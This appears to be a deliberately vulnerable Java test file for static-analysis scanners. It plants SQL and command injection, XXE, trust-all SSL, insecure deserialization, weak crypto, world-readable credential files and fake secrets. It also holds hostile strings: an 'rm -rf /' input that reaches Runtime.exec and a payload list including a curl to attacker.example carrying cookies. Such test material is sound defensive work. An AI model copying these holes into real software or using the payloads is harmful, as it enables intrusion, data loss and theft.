package com.example.test;

import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.security.*;
import java.sql.*;
import java.util.*;
import javax.crypto.*;
import javax.crypto.spec.*;
import javax.net.ssl.*;
import javax.xml.parsers.*;
import org.w3c.dom.*;
import org.xml.sax.InputSource;

/**
 * TestViolations.java
 *
 * A deliberately vulnerable / rule-violating file used to test static analysis rules.
 * Contains: hardcoded secrets, SQL injection, command injection, insecure crypto,
 * insecure deserialization, XXE, insecure SSL trust-all, weak randomness, unsafe file perms,
 * logging secrets, empty catch blocks, use of deprecated APIs, reflection misuse, etc.
 *
 * WARNING: Do NOT run this against production systems or expose to the internet.
 */
public class TestViolations {

    // Hardcoded secrets (should be flagged)
    public static String hardcodedPassword = "admin123";
    public static String awsAccessKey = "AKIAFAKEKEY1234567890";
    private static final String SECRET_KEY = "0123456789abcdef"; // weak symmetric key

    // Re-using a non-thread-safe static mutable field
    private static Connection connection;

    public static void main(String[] args) {
        try {
            // 1) SQL Injection: concatenating unsanitized input into query
            String userInput = getUserInputUnsafe();
            unsafeSqlQuery(userInput);

            // 2) Command Injection: passing unsanitized input to shell command
            runShellCommand("ls " + userInput);

            // 3) Insecure HTTP usage: sending credentials over HTTP
            sendCredentialsOverHttp("http://example.com/api/login", "user", hardcodedPassword);

            // 4) Weak crypto: MD5 hashing and DES encryption
            String hashed = weakMd5("passwordToHash");
            byte[] enc = weakDesEncrypt("somedata".getBytes(), SECRET_KEY);

            // 5) Insecure SSL: trusting all certificates
            makeInsecureSslRequest("https://self-signed.badssl.com/");

            // 6) Insecure temp file handling and bad file permissions
            createInsecureTempFile("sensitive-data=" + hardcodedPassword);

            // 7) Insecure randomness
            int r = nonSecureRandomInt();

            // 8) XML XXE vulnerable parsing
            parseXmlWithXxe("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>");

            // 9) Insecure deserialization (reading from untrusted stream)
            // Note: This is a demonstration — DO NOT deserialize untrusted input in real code.
            // The following will likely throw because no serialized object exists; it's here to trigger rules.
            try {
                insecureDeserialize(new ByteArrayInputStream(new byte[0]));
            } catch (Exception e) {
                // swallow - empty catch (bad practice)
            }

            // 10) Reflection to access private fields/methods
            reflectionAbuse();

            // 11) Unsafe logging (logging secrets)
            System.out.println("Logging secret: " + hardcodedPassword);

            // 12) Deprecated API usage example (Thread.stop is deprecated)
            Thread t = new Thread(() -> {
                while (true) {
                    try { Thread.sleep(1000); } catch (InterruptedException ie) { }
                }
            });
            t.start();
            try {
                // Deprecated usage (intentionally wrong)
                @SuppressWarnings("deprecation")
                MethodStop(t);
            } catch (Throwable ignore) { }

            // 13) Writing plaintext credentials to file with permissive permissions
            writePlaintextCredentials("creds.txt", "user=admin\npassword=" + hardcodedPassword);

        } catch (Exception e) {
            // Very generic exception handling (bad practice)
            e.printStackTrace();
        }
    }

    // ---------- Helper methods intentionally insecure ----------

    private static String getUserInputUnsafe() {
        // Read from env var or fallback to unsafe default containing shell chars
        String u = System.getenv("UNSAFE_INPUT");
        if (u == null) u = "../; rm -rf / #unsafe"; // suspicious input
        return u;
    }

    // SQL Injection: builds query with concatenation
    private static void unsafeSqlQuery(String user) throws SQLException {
        // Setup an in-memory H2-like connection simulation (not real DB here)
        try {
            // This is intentionally wrong: concatenated SQL
            String sql = "SELECT * FROM users WHERE name = '" + user + "'; --";
            System.out.println("Executing SQL: " + sql);
            // imagine executing directly
            if (connection == null) {
                // stub: not connecting for safety, but the string itself should trigger scanners
                connection = DriverManager.getConnection("jdbc:h2:mem:test");
            }
            Statement st = connection.createStatement();
            // Dangerous: executing unsanitized SQL
            st.executeQuery(sql);
        } catch (SQLException e) {
            // swallow specific info (bad)
        }
    }

    // Command injection via Runtime.exec with concatenated input
    private static void runShellCommand(String cmd) {
        try {
            System.out.println("Running command: " + cmd);
            Runtime.getRuntime().exec(cmd);
        } catch (IOException e) {
            // empty catch - hide failures
        }
    }

    // Unsafe HTTP: sending credentials over plain HTTP
    private static void sendCredentialsOverHttp(String url, String user, String password) {
        try {
            URL u = new URL(url);
            HttpURLConnection conn = (HttpURLConnection) u.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            String payload = "username=" + URLEncoder.encode(user, "UTF-8") +
                             "&password=" + URLEncoder.encode(password, "UTF-8");
            OutputStream os = conn.getOutputStream();
            os.write(payload.getBytes());
            os.flush();
            os.close();
            int code = conn.getResponseCode();
            System.out.println("Sent creds over HTTP, response: " + code);
        } catch (Exception e) {
            // ignore
        }
    }

    // Weak MD5 hashing (should use bcrypt/argon2)
    private static String weakMd5(String input) throws NoSuchAlgorithmException {
        MessageDigest md = MessageDigest.getInstance("MD5");
        byte[] d = md.digest(input.getBytes());
        return Base64.getEncoder().encodeToString(d);
    }

    // Weak DES encryption (deprecated and insecure)
    private static byte[] weakDesEncrypt(byte[] data, String key) throws Exception {
        SecretKeySpec sk = new SecretKeySpec(key.substring(0, 8).getBytes(), "DES");
        Cipher c = Cipher.getInstance("DES/ECB/PKCS5Padding");
        c.init(Cipher.ENCRYPT_MODE, sk);
        return c.doFinal(data);
    }

    // Insecure SSL trusting: accepts any certificate
    private static void makeInsecureSslRequest(String httpsUrl) throws Exception {
        TrustManager[] trustAllCerts = new TrustManager[] {
            new X509TrustManager() {
                public java.security.cert.X509Certificate[] getAcceptedIssuers() { return null; }
                public void checkClientTrusted(java.security.cert.X509Certificate[] certs, String authType) { }
                public void checkServerTrusted(java.security.cert.X509Certificate[] certs, String authType) { }
            }
        };
        SSLContext sc = SSLContext.getInstance("TLS");
        sc.init(null, trustAllCerts, new java.security.SecureRandom());
        HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
        // Also disable hostname verification
        HttpsURLConnection.setDefaultHostnameVerifier((hostname, session) -> true);

        URL url = new URL(httpsUrl);
        HttpsURLConnection conn = (HttpsURLConnection) url.openConnection();
        conn.connect();
        System.out.println("Insecure SSL request made to " + httpsUrl + " with code " + conn.getResponseCode());
        conn.disconnect();
    }

    // Create temp file insecurely and set permissive permissions
    private static void createInsecureTempFile(String content) throws IOException {
        File tmp = File.createTempFile("tmp", ".txt");
        // write sensitive data in plaintext
        Files.write(tmp.toPath(), content.getBytes());
        // make file world-readable (bad)
        tmp.setReadable(true, false);
        tmp.setWritable(true, false);
        System.out.println("Wrote temp file at " + tmp.getAbsolutePath());
    }

    // Non-secure randomness
    private static int nonSecureRandomInt() {
        Random r = new Random(); // use SecureRandom instead
        return r.nextInt();
    }

    // XML parsing vulnerable to XXE
    private static void parseXmlWithXxe(String xml) throws Exception {
        DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
        // Intentionally not disabling external entities (vulnerable)
        DocumentBuilder db = dbf.newDocumentBuilder();
        Document doc = db.parse(new InputSource(new StringReader(xml)));
        System.out.println("Parsed XML root: " + doc.getDocumentElement().getNodeName());
    }

    // Insecure deserialization - reading ObjectInputStream from untrusted source
    private static Object insecureDeserialize(InputStream in) throws Exception {
        ObjectInputStream ois = new ObjectInputStream(in);
        Object obj = ois.readObject(); // dangerous if input is untrusted
        ois.close();
        return obj;
    }

    // Reflection misuse: invoking private methods and changing accessibility
    private static void reflectionAbuse() throws Exception {
        Class<?> cls = Class.forName("java.lang.String");
        // Access private constructor (not really useful for String) - misuse
        try {
            java.lang.reflect.Constructor<?> ctor = cls.getDeclaredConstructor(byte[].class);
            ctor.setAccessible(true);
            Object s = ctor.newInstance("reflect".getBytes());
            System.out.println("Made string via reflection: " + s);
        } catch (NoSuchMethodException nsme) {
            // swallow
        }
    }

    // Deprecated method invocation wrapper
    private static void MethodStop(Thread t) {
        // Intentionally call deprecated stop if available (bad practice)
        try {
            MethodStopDeprecated(t);
        } catch (Throwable ignored) { }
    }

    @SuppressWarnings("deprecation")
    private static void MethodStopDeprecated(Thread t) {
        // Deprecated API to be flagged by scanners
        t.stop();
    }

    // Write plaintext credentials to disk with permissive permissions
    private static void writePlaintextCredentials(String fileName, String content) {
        try {
            Path p = Paths.get(fileName);
            Files.write(p, content.getBytes(), StandardOpenOption.CREATE, StandardOpenOption.TRUNCATE_EXISTING);
            // Make file world-readable (bad)
            File f = p.toFile();
            f.setReadable(true, false);
            f.setWritable(true, false);
            System.out.println("Wrote credentials to " + fileName);
        } catch (IOException e) {
            // ignore errors
        }
    }

    // Simulate writing a private key as a test fixture (fake key only)
    private static void writeFakePrivateKey() {
        String fakeKey = "-----BEGIN RSA PRIVATE KEY-----\n" +
                "MIIEFAKEKEYEXAMPLETHISISNOTREALDONOTUSE\n" +
                "-----END RSA PRIVATE KEY-----\n";
        try {
            Files.write(Paths.get("id_rsa_test"), fakeKey.getBytes());
            // bad file perms
            new File("id_rsa_test").setReadable(true, false);
        } catch (IOException e) { }
    }

    // Generate strings and payloads likely to trigger detectors (SQLi, XSS, etc.)
    public static List<String> generateEvilPayloads() {
        List<String> p = new ArrayList<>();
        p.add("' OR '1'='1'; --");
        p.add("'; DROP TABLE users; --");
        p.add("<script>alert('xss')</script>");
        p.add("../../../etc/passwd");
        p.add("`; curl http://attacker.example/p?cookie=$COOKIE;`");
        p.add("<?xml version=\"1.0\"?><!DOCTYPE xxe [<!ENTITY % ext SYSTEM \"file:///etc/hosts\"><!ENTITY e SYSTEM \"%ext;\">]><data>&e;</data>");
        return p;
    }
}
